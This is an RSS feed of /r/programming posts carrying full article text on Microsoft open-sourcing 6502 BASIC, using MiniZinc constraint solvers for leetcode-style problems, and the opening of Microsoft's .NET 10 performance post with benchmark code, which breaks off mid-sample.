<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><atom:link href="http://192.168.1.132/?platform=reddit&amp;subreddit=programming&amp;averagePostsPerDay=5&amp;content&amp;view=rss" rel="self" type="application/rss+xml"/><title>/r/programming</title><description>Hot posts in /r/programming (roughly 5 posts per day)</description><link>https://www.reddit.com/r/programming/</link><language>en-us</language><lastBuildDate>Thu, 11 Sep 2025 09:33:42 +0000</lastBuildDate><generator>Upvote RSS</generator><image><url>https://styles.redditmedia.com/t5_2fwo/styles/communityIcon_1bqa1ibfp8q11.png</url><title>/r/programming</title><link>https://www.reddit.com/r/programming/</link></image><item><link>https://gizmodo.com/microsoft-goes-back-to-basic-open-sources-bill-gates-code-2000654010</link><title>Microsoft Goes Back to BASIC, Open-Sources Bill Gates' Code (gizmodo.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1ndpzfz/microsoft_goes_back_to_basic_opensources_bill/</guid><comments>https://www.reddit.com/r/programming/comments/1ndpzfz/microsoft_goes_back_to_basic_opensources_bill/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1ndpzfz/microsoft_goes_back_to_basic_opensources_bill/'>Post permalink</a></p></section><section class='preview-image'><img src='https://gizmodo.com/app/uploads/2020/08/z1olh9qw8p81mdbspql3.jpg' /></section><section class='parsed-content'><div><p>In the era of vibe coding, when even professionals are pawning off their programming work on AI tools, Microsoft is throwing it all the way back to the language that launched a billion devices. On Wednesday, the company <a href="https://opensource.microsoft.com/blog/2025/09/03/microsoft-open-source-historic-6502-basic/">announced</a> that it would make the source code for Microsoft BASIC for the 6502 Version 1.1 publicly available and open-source. The code is now <a href="https://github.com/microsoft/BASIC-M6502">uploaded to GitHub</a> under an MIT license (with a cheeky commit time stamp of &ldquo;48 years ago&rdquo;).</p><p>Microsoft called the code&mdash;written by the company&rsquo;s founder, Bill Gates, and its second-ever employee, Ric Weiland&mdash;&rdquo;one of the most historically significant pieces of software from the early personal computer era.&rdquo; It&rsquo;s pretty simple, clocking in at just 6,955 lines of assembly language, but that simplicity was key to its becoming so foundational to just about everything.</p><p>The <a href="https://spectrum.ieee.org/chip-hall-of-fame-mos-technology-6502-microprocessor">MOS 6502 processor</a>, which ran the code, was inexpensive and accessible compared to contemporary alternatives, and variations of the chip would eventually find their way into the Atari 2600, Nintendo Entertainment System, and Commodore computers. In fact, the story goes that Microsoft licensed its 6502 BASIC to Commodore for a flat fee of $25,000, which turned out to be a great deal for Commodore, which shipped millions of computers running the code.</p><p>Per Microsoft, the company&rsquo;s first product was a BASIC interpreter for the Intel 8080, which was written by Gates and co-founder Paul Allen. The version the company dropped on GitHub is actually an updated version of BASIC, which contains bug fixes implemented by Gates and Commodore engineer John Feagans. While it&rsquo;s called 1.1 on GitHub, Microsoft said it initially shipped as BASIC V2.</p><p>It&rsquo;s kind of a big deal for Microsoft to finally open-source the entirety of the code, which was previously only available in bits and pieces. Without Microsoft&rsquo;s official blessing to make this code public, it was possible that the original documentation, as well as the legal permission needed to use the code, would have been lost to history. Now it&rsquo;s possible for the code to be preserved, played with, and better understood.</p><p>As <a href="https://arstechnica.com/gadgets/2025/09/microsoft-open-sources-bill-gates-6502-basic-from-1978/">Ars Technica points out</a>, the assembly code can&rsquo;t be run on modern devices directly, but is still functional in emulators and field-programmable gate array (FPGA) implementations that allow researchers and programmers to explore old code and mine it for everything from just understanding how it works to understanding how programmers of the past approached efficient design practices.</p><p>BASIC 5502 joins <a href="https://github.com/microsoft/GW-BASIC">GW-BASIC</a>, <a href="https://github.com/microsoft/MS-DOS">MS-DOS</a>, and the <a href="https://github.com/option8/Altair-BASIC">Altair BASIC</a> on the list of code that Microsoft has open-sourced in recent years.</p></div></section>]]></description><pubDate>Thu, 11 Sep 2025 02:23:02 +0530</pubDate></item><item><link>https://buttondown.com/hillelwayne/archive/many-hard-leetcode-problems-are-easy-constraint/</link><title>Many Hard Leetcode Problems are Easy Constraint Problems (buttondown.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1ndjw6y/many_hard_leetcode_problems_are_easy_constraint/</guid><comments>https://www.reddit.com/r/programming/comments/1ndjw6y/many_hard_leetcode_problems_are_easy_constraint/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 7 min | <a href='https://www.reddit.com/r/programming/comments/1ndjw6y/many_hard_leetcode_problems_are_easy_constraint/'>Post permalink</a></p></section><section class='preview-image'><img src='https://assets.buttondown.email/images/63337f78-7138-4b21-87a0-917c0c5b1706.jpg?w=960&fit=max' /></section><section class='parsed-content'><div><date> September 10, 2025 </date> <h2> Use the right tool for the job. </h2><p>In my first interview out of college I was asked the change counter problem:</p><blockquote><p>Given a set of coin denominations, find the minimum number of coins required to make change for a given number. IE for USA coinage and 37 cents, the minimum number is four (quarter, dime, 2 pennies).</p></blockquote><p>I implemented the simple greedy algorithm and immediately fell into the trap of the question: the greedy algorithm only works for "well-behaved" denominations. If the coin values were <code>[10, 9, 1]</code>, then making 37 cents would take 10 coins in the greedy algorithm but only 4 coins optimally (<code>10+9+9+9</code>). The "smart" answer is to use a dynamic programming algorithm, which I didn't know how to do. So I failed the interview.</p><p>But you only need dynamic programming if you're writing your own algorithm. It's really easy if you throw it into a constraint solver like <a href="https://www.minizinc.org/">MiniZinc</a> and call it a day. </p><div><pre><code>int: total; array[int] of int: values = [10, 9, 1]; array[index_set(values)] of var 0..: coins; constraint sum (c in index_set(coins)) (coins[c] * values[c]) == total; solve minimize sum(coins); </code></pre></div><p>You can try this online <a href="https://play.minizinc.dev/">here</a>. It'll give you a prompt to put in <code>total</code> and then give you successively-better solutions:</p><div><pre><span></span><code>coins = [0, 0, 37]; ---------- coins = [0, 1, 28]; ---------- coins = [0, 2, 19]; ---------- coins = [0, 3, 10]; ---------- coins = [0, 4, 1]; ---------- coins = [1, 3, 0]; ---------- </code></pre></div><p>Lots of similar interview questions are this kind of mathematical optimization problem, where we have to find the maximum or minimum of a function corresponding to constraints. They're hard in programming languages because programming languages are too low-level. They are also exactly the problems that constraint solvers were designed to solve. Hard leetcode problems are easy constraint problems.<sup><a href="https://buttondown.com#fn:leetcode">1</a></sup>Here I'm using MiniZinc, but you could just as easily use Z3 or OR-Tools or whatever your favorite generalized solver is.</p><h3>More examples</h3><p>This was a question in a different interview (which I thankfully passed):</p><blockquote><p>Given a list of stock prices through the day, find maximum profit you can get by buying one stock and selling one stock later.</p></blockquote><p>It's easy to do in O(n^2) time, or if you are clever, you can do it in O(n). Or you could be not clever at all and just write it as a constraint problem:</p><div><pre><code>array[int] of int: prices = [3, 1, 4, 1, 5, 9, 2, 6, 5, 3, 5, 8]; var int: buy; var int: sell; var int: profit = prices[sell] - prices[buy]; constraint sell &gt; buy; constraint profit &gt; 0; solve maximize profit; </code></pre></div><p>Reminder, link to trying it online <a href="https://play.minizinc.dev/">here</a>. While working at that job, one interview question we tested out was:</p><blockquote><p>Given a list, determine if three numbers in that list can be added or subtracted to give 0? </p></blockquote><p>This is a satisfaction problem, not a constraint problem: we don't need the "best answer", any answer will do. We eventually decided against it for being too tricky for the engineers we were targeting. But it's not tricky in a solver; </p><div><pre><span></span><code>include "globals.mzn"; array[int] of int: numbers = [3, 1, 4, 1, 5, 9, 2, 6, 5, 3, 5, 8]; array[index_set(numbers)] of var {0, -1, 1}: choices; constraint sum(n in index_set(numbers)) (numbers[n] * choices[n]) = 0; constraint count(choices, -1) + count(choices, 1) = 3; solve satisfy; </code></pre></div><p>Okay, one last one, a problem I saw last year at <a href="https://chicagopython.github.io/algosig/">Chipy AlgoSIG</a>. Basically they pick some leetcode problems and we all do them. I failed to solve <a href="https://leetcode.com/problems/largest-rectangle-in-histogram/description/">this one</a>:</p><blockquote><p>Given an array of integers heights representing the histogram's bar height where the width of each bar is 1, return the area of the largest rectangle in the histogram.</p></blockquote><p>The "proper" solution is a tricky thing involving tracking lots of bookkeeping states, which you can completely bypass by expressing it as constraints:</p><div><pre><code>array[int] of int: numbers = [2,1,5,6,2,3]; var 1..length(numbers): x; var 1..length(numbers): dx; var 1..: y; constraint x + dx &lt;= length(numbers); constraint forall (i in x..(x+dx)) (y &lt;= numbers[i]); var int: area = (dx+1)*y; solve maximize area; output ["(\(x)-&gt;\(x+dx))*\(y) = \(area)"] </code></pre></div><p>There's even a way to <a href="https://docs.minizinc.dev/en/2.9.3/visualisation.html">automatically visualize the solution</a> (using <code>vis_geost_2d</code>), but I didn't feel like figuring it out in time for the newsletter.</p><h3>Is this better?</h3><p>Now if I actually brought these questions to an interview the interviewee could ruin my day by asking "what's the runtime complexity?" Constraint solvers runtimes are unpredictable and almost always than an ideal bespoke algorithm because they are more expressive, in what I refer to as the <a href="https://buttondown.com/hillelwayne/archive/the-capability-tractability-tradeoff/">capability/tractability tradeoff</a>. But even so, they'll do way better than a <em>bad</em> bespoke algorithm, and I'm not experienced enough in handwriting algorithms to consistently beat a solver.</p><p>The real advantage of solvers, though, is how well they handle new constraints. Take the stock picking problem above. I can write an O(n&sup2;) algorithm in a few minutes and the O(n) algorithm if you give me some time to think. Now change the problem to</p><blockquote><p>Maximize the profit by buying and selling up to <code>max_sales</code> stocks, but you can only buy or sell one stock at a given time and you can only hold up to <code>max_hold</code> stocks at a time?</p></blockquote><p>That's a way harder problem to write even an inefficient algorithm for! While the constraint problem is only a tiny bit more complicated:</p><div><pre><span></span><code>include "globals.mzn"; int: max_sales = 3; int: max_hold = 2; array[int] of int: prices = [3, 1, 4, 1, 5, 9, 2, 6, 5, 3, 5, 8]; array [1..max_sales] of var int: buy; array [1..max_sales] of var int: sell; array [index_set(prices)] of var 0..max_hold: stocks_held; var int: profit = sum(s in 1..max_sales) (prices[sell[s]] - prices[buy[s]]); constraint forall (s in 1..max_sales) (sell[s] &gt; buy[s]); constraint profit &gt; 0; constraint forall(i in index_set(prices)) (stocks_held[i] = (count(s in 1..max_sales) (buy[s] &lt;= i) - count(s in 1..max_sales) (sell[s] &lt;= i))); constraint alldifferent(buy ++ sell); solve maximize profit; output ["buy at \(buy)\n", "sell at \(sell)\n", "for \(profit)"]; </code></pre></div><p>Most constraint solving examples online are puzzles, like <a href="https://docs.minizinc.dev/en/stable/modelling2.html#ex-sudoku">Sudoku</a> or "<a href="https://docs.minizinc.dev/en/stable/modelling2.html#ex-smm">SEND + MORE = MONEY</a>". Solving leetcode problems would be a more interesting demonstration. And you get more interesting opportunities to teach optimizations, like symmetry breaking.</p><p><em>If you're reading this on the web, you can subscribe <a href="https://buttondown.com/hillelwayne">here</a>. Updates are once a week. My main website is <a href="https://www.hillelwayne.com">here</a>.</em></p><p><em>My new book, </em>Logic for Programmers<em>, is now in early access! Get it <a href="https://leanpub.com/logic/">here</a>.</em></p></div></section>]]></description><pubDate>Wed, 10 Sep 2025 22:31:10 +0530</pubDate></item><item><link>https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-10/</link><title>Performance Improvements in .NET 10 (devblogs.microsoft.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1ndemk4/performance_improvements_in_net_10/</guid><comments>https://www.reddit.com/r/programming/comments/1ndemk4/performance_improvements_in_net_10/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 354 min | <a href='https://www.reddit.com/r/programming/comments/1ndemk4/performance_improvements_in_net_10/'>Post permalink</a></p></section><section class='preview-image'><img src='https://devblogs.microsoft.com/dotnet/wp-content/uploads/sites/10/2025/09/net10perf.jpg' /></section><section class='parsed-content'><article><div><p>My kids <em>love</em> &ldquo;Frozen&rdquo;. They can sing every word, re-enact every scene, and provide detailed notes on the proper sparkle of Elsa&rsquo;s ice dress. I&rsquo;ve seen the movie more times than I can recount, to the point where, if you&rsquo;ve seen me do any live coding, you&rsquo;ve probably seen my subconscious incorporate an Arendelle reference or two. After so many viewings, I began paying closer attention to the details, like how at the very beginning of the film the ice harvesters are singing a song that subtly foreshadows the story&rsquo;s central conflicts, the characters&rsquo; journeys, and even the key to resolving the climax. I&rsquo;m slightly ashamed to admit I didn&rsquo;t comprehend this connection until viewing number ten or so, at which point I also realized I had no idea if this ice harvesting was actually &ldquo;a thing&rdquo; or if it was just a clever vehicle for Disney to spin a yarn. Turns out, as I subsequently researched, it&rsquo;s quite real.</p><p>In the 19th century, before refrigeration, ice was an incredibly valuable commodity. Winters in the northern United States turned ponds and lakes into seasonal gold mines. The most successful operations ran with precision: workers cleared snow from the surface so the ice would grow thicker and stronger, and they scored the surface into perfect rectangles using horse-drawn plows, turning the lake into a frozen checkerboard. Once the grid was cut, teams with long saws worked to free uniform blocks weighing several hundred pounds each. These blocks were floated along channels of open water toward the shore, at which point men with poles levered the blocks up ramps and hauled them into storage. Basically, what the movie shows.</p><p>The storage itself was an art. Massive wooden ice houses, sometimes holding tens of thousands of tons, were lined with insulation, typically straw. Done well, this insulation could keep the ice solid for months, even through summer heat. Done poorly, you would open the doors to slush. And for those moving ice over long distances, typically by ship, every degree, every crack in the insulation, every extra day in transit meant more melting and more loss.</p><p>Enter Frederic Tudor, the &ldquo;Ice King&rdquo; of Boston. He was obsessed with systemic efficiency. Where competitors saw unavoidable loss, Tudor saw a solvable problem. After experimenting with different insulators, he leaned on cheap sawdust, a lumber mill byproduct that outperformed straw, packing it densely around the ice to cut melt losses significantly. For harvesting efficiency, his operations adopted Nathaniel Jarvis Wyeth&rsquo;s grid-scoring system, which produced uniform blocks that could be packed tightly, minimizing air gaps that would otherwise increase exposure in a ship&rsquo;s hold. And to shorten the critical time between shore and ship, Tudor built out port infrastructure and depots near docks, allowing ships to load and unload much faster. Each change, from tools to ice house design to logistics, amplified the last, turning a risky local harvest into a reliable global trade. With Tudor&rsquo;s enhancements, he had solid ice arriving in places like Havana, Rio de Janeiro, and even Calcutta (a voyage of four months in the 1830s). His performance gains allowed the product to survive journeys that were previously unthinkable.</p><p>What made Tudor&rsquo;s ice last halfway around the world wasn&rsquo;t one big idea. It was a plethora of small improvements, each multiplying the effect of the last. In software development, the same principle holds: big leaps forward in performance rarely come from a single sweeping change, rather from hundreds or thousands of targeted optimizations that compound into something transformative. .NET 10&rsquo;s performance story isn&rsquo;t about one Disney-esque magical idea; it&rsquo;s about carefully shaving off nanoseconds here and tens of bytes there, streamlining operations that are executed trillions of times.</p><p>In the rest of this post, just as we did in Performance Improvements in <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-9/">.NET 9</a>, <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-8/">.NET 8</a>, <a href="https://devblogs.microsoft.com/dotnet/performance_improvements_in_net_7/">.NET 7</a>, <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-6">.NET 6</a>, <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-5">.NET 5</a>, <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-core-3-0">.NET Core 3.0</a>, <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-core-2-1">.NET Core 2.1</a>, and <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-core">.NET Core 2.0</a>, we&rsquo;ll dig into hundreds of the small but meaningful and compounding performance improvements since .NET 9 that make up .NET 10&rsquo;s story (if you instead stay on LTS releases and thus are upgrading from .NET 8 instead of from .NET 9, you&rsquo;ll see even more improvements based on the aggregation from all the <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-9/">improvements in .NET 9</a> as well). So, without further ado, go grab a cup of your favorite hot beverage (or, given my intro, maybe something a bit more frosty), sit back, relax, and &ldquo;Let It Go&rdquo;!</p><p>Or, hmm, maybe, let&rsquo;s push performance &ldquo;Into the Unknown&rdquo;?</p><p>Let .NET 10 performance &ldquo;Show Yourself&rdquo;?</p><p>&ldquo;Do You Want To Build a <del>Snowman</del> Fast Service?&rdquo;</p><p>I&rsquo;ll see myself out.</p><h2>Benchmarking Setup</h2><p>As in previous posts, this tour is chock full of micro-benchmarks intended to showcase various performance improvements. Most of these benchmarks are implemented using <a href="https://www.nuget.org/packages/BenchmarkDotNet/0.15.2">BenchmarkDotNet 0.15.2</a>, with a simple setup for each.</p><p>To follow along, make sure you have <a href="https://dotnet.microsoft.com/download/dotnet/9.0">.NET 9</a> and <a href="https://dotnet.microsoft.com/download/dotnet/10.0">.NET 10</a> installed, as most of the benchmarks compare the same test running on each. Then, create a new C# project in a new <code>benchmarks</code> directory:</p><pre><code>dotnet new console -o benchmarks cd benchmarks</code></pre><p>That will produce two files in the <code>benchmarks</code> directory: <code>benchmarks.csproj</code>, which is the project file with information about how the application should be compiled, and <code>Program.cs</code>, which contains the code for the application. Finally, replace everything in <code>benchmarks.csproj</code> with this:</p><pre><code><project><propertygroup><outputtype>Exe</outputtype> <targetframeworks>net10.0;net9.0</targetframeworks> <langversion>Preview</langversion> <implicitusings>enable</implicitusings> <nullable>enable</nullable> <servergarbagecollection>true</servergarbagecollection> </propertygroup><itemgroup><packagereference></packagereference> </itemgroup></project></code></pre><p>With that, we&rsquo;re good to go. Unless otherwise noted, I&rsquo;ve tried to make each benchmark standalone; just copy/paste its whole contents into the Program.cs file, overwriting everything that&rsquo;s there, and then run the benchmarks. Each test includes at its top a comment for the <code>dotnet</code> command to use to run the benchmark. It&rsquo;s typically something like this:</p><pre><code>dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0</code></pre><p>which will run the benchmark in release on both .NET 9 and .NET 10 and show the compared results. The other common variation, used when the benchmark should only be run on .NET 10 (typically because it&rsquo;s comparing two approaches rather than comparing one thing on two versions), is the following:</p><pre><code>dotnet run -c Release -f net10.0 --filter "*"</code></pre><p>Throughout the post, I&rsquo;ve shown many benchmarks and the results I received from running them. Unless otherwise stated (e.g. because I&rsquo;m demonstrating an OS-specific improvement), the results shown are from running them on Linux (Ubuntu 24.04.1) on an x64 processor.</p><pre><code>BenchmarkDotNet v0.15.2, Linux Ubuntu 24.04.1 LTS (Noble Numbat) 11th Gen Intel Core i9-11950H 2.60GHz, 1 CPU, 16 logical and 8 physical cores .NET SDK 10.0.100-rc.1.25451.107 [Host] : .NET 9.0.9 (9.0.925.41916), X64 RyuJIT AVX-512F+CD+BW+DQ+VL+VBMI</code></pre><p>As always, a quick disclaimer: these are micro-benchmarks, timing operations so short you&rsquo;d miss them by blinking (but when such operations run millions of times, the savings really add up). The exact numbers you get will depend on your hardware, your operating system, what else your machine is juggling at the moment, how much coffee you&rsquo;ve had since breakfast, and perhaps whether Mercury is in retrograde. In other words, don&rsquo;t expect your results to match mine exactly, but I&rsquo;ve picked tests that should still be reasonably reproducible in the real world.</p><p>Now, let&rsquo;s start at the bottom of the stack. Code generation.</p><h2>JIT</h2><p>Among all areas of .NET, the Just-In-Time (JIT) compiler stands out as one of the most impactful. Every .NET application, whether a small console tool or a large-scale enterprise service, ultimately relies on the JIT to turn intermediate language (IL) code into optimized machine code. Any enhancement to the JIT&rsquo;s generated code quality has a ripple effect, improving performance across the entire ecosystem without requiring developers to change any of their own code or even recompile their C#. And with .NET 10, there&rsquo;s no shortage of these improvements.</p><h3>Deabstraction</h3><p>As with many languages, .NET historically has had an &ldquo;abstraction penalty,&rdquo; those extra allocations and indirections that can occur when using high-level language features like interfaces, iterators, and delegates. Each year, the JIT gets better and better at optimizing away layers of abstraction, so that developers get to write simple code and still get great performance. .NET 10 continues this tradition. The result is that idiomatic C# (using interfaces, <code>foreach</code> loops, lambdas, etc.) runs even closer to the raw speed of meticulously crafted and hand-tuned code.</p><h4>Object Stack Allocation</h4><p>One of the most exciting areas of deabstraction progress in .NET 10 is the expanded use of escape analysis to enable stack allocation of objects. Escape analysis is a compiler technique to determine whether an object allocated in a method escapes that method, meaning determining whether that object is reachable after the method returns (for example, by being stored in a field or returned to the caller) or used in some way that the runtime can&rsquo;t track within the method (like passed to an unknown callee). If the compiler can prove an object doesn&rsquo;t escape, then that object&rsquo;s lifetime is bounded by the method, and it can be allocated on the stack instead of on the heap. Stack allocation is much cheaper (just pointer bumping for allocation and automatic freeing when the method exits) and reduces GC pressure because, well, the object doesn&rsquo;t need to be tracked by the GC. .NET 9 had already introduced some limited escape analysis and stack allocation support; .NET 10 takes this significantly further.</p><p><a href="https://github.com/dotnet/runtime/pull/115172">dotnet/runtime#115172</a> teaches the JIT how to perform escape analysis related to delegates, and in particular that a delegate&rsquo;s <code>Invoke</code> method (which is implemented by the runtime) does not stash away the <code>this</code> reference. Then if escape analysis can prove that the delegate&rsquo;s object reference is something that otherwise hasn&rsquo;t escaped, the delegate can effectively evaporate. Consider this benchmark:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "y")] public partial class Tests { [Benchmark] [Arguments(42)] public int Sum(int y) { Func<int> addY = x =&gt; x + y; return DoubleResult(addY, y); } private int DoubleResult(Func<int> func, int arg) { int result = func(arg); return result + result; } }</int></int></code></pre><p>If we just run this benchmark and compare .NET 9 and .NET 10, we can immediately tell something interesting is happening.</p><table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Code Size</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>Sum</td> <td>.NET 9.0</td> <td>19.530 ns</td> <td>1.00</td> <td>118 B</td> <td>88 B</td> <td>1.00</td> </tr> <tr> <td>Sum</td> <td>.NET 10.0</td> <td>6.685 ns</td> <td>0.34</td> <td>32 B</td> <td>24 B</td> <td>0.27</td> </tr> </tbody> </table><p>The C# code for <code>Sum</code> belies complicated code generation by the C# compiler. It needs to create a <code>Func<int></int></code>, which is &ldquo;closing over&rdquo; the <code>y</code> &ldquo;local&rdquo;. That means the compiler needs to &ldquo;lift&rdquo; <code>y</code> to no longer be an actual local, and instead live as a field on an object; the delegate can then point to a method on that object, giving it access to <code>y</code>. This is approximately what the IL generated by the C# compiler looks like when decompiled to C#:</p><pre><code>public int Sum(int y) { &lt;&gt;c__DisplayClass0_0 c = new(); c.y = y; Func<int> func = new(c.<sum>b__0); return DoubleResult(func, c.y); } private sealed class &lt;&gt;c__DisplayClass0_0 { public int y; internal int <sum>b__0(int x) =&gt; x + y; }</sum></sum></int></code></pre><p>From that, we can see the closure is resulting in two allocations: an allocation for the &ldquo;display class&rdquo; (what the C# compiler calls these closure types) and an allocation for the delegate that points to the <code><sum>b__0</sum></code> method on that display class instance. That&rsquo;s what&rsquo;s accounting for the <code>88</code> bytes of allocation in the .NET 9 results: the display class is 24 bytes, and the delegate is 64 bytes. In the .NET 10 version, though, we only see a 24 byte allocation; that&rsquo;s because the JIT has successfully elided the delegate allocation. Here is the resulting assembly code:</p><pre><code>; .NET 9 ; Tests.Sum(Int32) push rbp push r15 push rbx lea rbp,[rsp+10] mov ebx,esi mov rdi,offset MT_Tests+&lt;&gt;c__DisplayClass0_0 call CORINFO_HELP_NEWSFAST mov r15,rax mov [r15+8],ebx mov rdi,offset MT_System.Func<system.int32> call CORINFO_HELP_NEWSFAST mov rbx,rax lea rdi,[rbx+8] mov rsi,r15 call CORINFO_HELP_ASSIGN_REF mov rax,offset Tests+&lt;&gt;c__DisplayClass0_0.<sum>b__0(Int32) mov [rbx+18],rax mov esi,[r15+8] cmp [rbx+18],rax jne short M00_L01 mov rax,[rbx+8] add esi,[rax+8] mov eax,esi M00_L00: add eax,eax pop rbx pop r15 pop rbp ret M00_L01: mov rdi,[rbx+8] call qword ptr [rbx+18] jmp short M00_L00 ; Total bytes of code 112 ; .NET 10 ; Tests.Sum(Int32) push rbx mov ebx,esi mov rdi,offset MT_Tests+&lt;&gt;c__DisplayClass0_0 call CORINFO_HELP_NEWSFAST mov [rax+8],ebx mov eax,[rax+8] mov ecx,eax add eax,ecx add eax,eax pop rbx ret ; Total bytes of code 32</sum></system.int32></code></pre><p>In both .NET 9 and .NET 10, the JIT successfully inlined <code>DoubleResult</code>, such that the delegate doesn&rsquo;t escape, but then in .NET 10, it&rsquo;s able to stack allocate it. Woo hoo! There&rsquo;s obviously still future opportunity here, as the JIT doesn&rsquo;t elide the allocation of the closure object, but that should be addressable with some more effort, hopefully in the near future.</p><p><a href="https://github.com/dotnet/runtime/pull/104906">dotnet/runtime#104906</a> from <a href="https://github.com/hez2010">@hez2010</a> and <a href="https://github.com/dotnet/runtime/pull/112250">dotnet/runtime#112250</a> extend this kind of analysis and stack allocation to arrays. How many times have you written code like this?</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Runtime.CompilerServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { [Benchmark] public void Test() { Process(new string[] { "a", "b", "c" }); static void Process(string[] inputs) { foreach (string input in inputs) { Use(input); } [MethodImpl(MethodImplOptions.NoInlining)] static void Use(string input) { } } } }</code></pre><p>Some method I want to call accepts an array of inputs and does something for each input. I need to allocate an array to pass my inputs in, either explicitly, or maybe implicitly due to using <code>params</code> or a collection expression. Ideally moving forward there would be an overload of such a <code>Process</code> method that accepted a <code>ReadOnlySpan<string></string></code> instead of a <code>string[]</code>, and I could then avoid the allocation by construction. But for all of these cases where I&rsquo;m forced to create an array, .NET 10 comes to the rescue.</p><table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>Test</td> <td>.NET 9.0</td> <td>11.580 ns</td> <td>1.00</td> <td>48 B</td> <td>1.00</td> </tr> <tr> <td>Test</td> <td>.NET 10.0</td> <td>3.960 ns</td> <td>0.34</td> <td>&ndash;</td> <td>0.00</td> </tr> </tbody> </table><p>The JIT was able to inline <code>Process</code>, see that the array never leaves the frame, and stack allocate it.</p><p>Of course, now that we&rsquo;re able to stack allocate arrays, we also want to be able to deal with a common way those arrays are used: via spans. <a href="https://github.com/dotnet/runtime/pull/113977">dotnet/runtime#113977</a> and <a href="https://github.com/dotnet/runtime/pull/116124">dotnet/runtime#116124</a> teach escape analysis to be able to reason about the fields in structs, which includes <code>Span<t></t></code>, as it&rsquo;s &ldquo;just&rdquo; a struct that stores a <code>ref T</code> field and an <code>int</code> length field.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Runtime.CompilerServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private byte[] _buffer = new byte[3]; [Benchmark] public void Test() =&gt; Copy3Bytes(0x12345678, _buffer); [MethodImpl(MethodImplOptions.NoInlining)] private static void Copy3Bytes(int value, Span<byte> dest) =&gt; BitConverter.GetBytes(value).AsSpan(0, 3).CopyTo(dest); }</byte></code></pre><p>Here, we&rsquo;re using <code>BitConverter.GetBytes</code>, which allocates a <code>byte[]</code> containing the bytes from the input (in this case, it&rsquo;ll be a four-byte array for the <code>int</code>), then we slice off three of the four bytes, and we copy them to the destination span.</p><table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>Test</td> <td>.NET 9.0</td> <td>9.7717 ns</td> <td>1.04</td> <td>32 B</td> <td>1.00</td> </tr> <tr> <td>Test</td> <td>.NET 10.0</td> <td>0.8718 ns</td> <td>0.09</td> <td>&ndash;</td> <td>0.00</td> </tr> </tbody> </table><p>In .NET 9, we get the 32-byte allocation we&rsquo;d expect for the <code>byte[]</code> in <code>GetBytes</code> (every object on 64-bit is at least 24 bytes, which will include the four bytes for the array&rsquo;s length, and then the four bytes for the data will be in slots 24-27, and the size will be padded up to the next word boundary, for 32). In .NET 10, with <code>GetBytes</code> and <code>AsSpan</code> inlined, the JIT can see that the array doesn&rsquo;t escape, and a stack allocated version of it can be used to seed the span, just as if it were created from any other stack allocation (like <code>stackalloc</code>). (This case also needed a little help from <a href="https://github.com/dotnet/runtime/pull/113093">dotnet/runtime#113093</a>, which taught the JIT that certain span operations, like the <code>Memmove</code> used internally by <code>CopyTo</code>, are non-escaping.)</p><h4>Devirtualization</h4><p>Interfaces and virtual methods are a critical aspect of .NET and the abstractions it enables. Being able to unwind these abstractions and &ldquo;devirtualize&rdquo; is then an important job for the JIT, which has taken notable leaps in capabilities here in .NET 10.</p><p>While arrays are one of the most central features provided by C# and .NET, and while the JIT exerts a lot of energy and does a great job optimizing many aspects of arrays, one area in particular has caused it pain: an array&rsquo;s interface implementations. The runtime manufactures a bunch of interface implementations for <code>T[]</code>, and because they&rsquo;re implemented differently from literally every other interface implementation in .NET, the JIT hasn&rsquo;t been able to apply the same devirtualization capabilities it&rsquo;s applied elsewhere. And, for anyone who&rsquo;s dived deep into micro-benchmarks, this can lead to some odd observations. Here&rsquo;s a performance comparison between iterating over a <code>ReadOnlyCollection<t></t></code> using a <code>foreach</code> loop (going through its enumerator) and using a <code>for</code> loop (indexing on each element).</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" // dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Collections.ObjectModel; 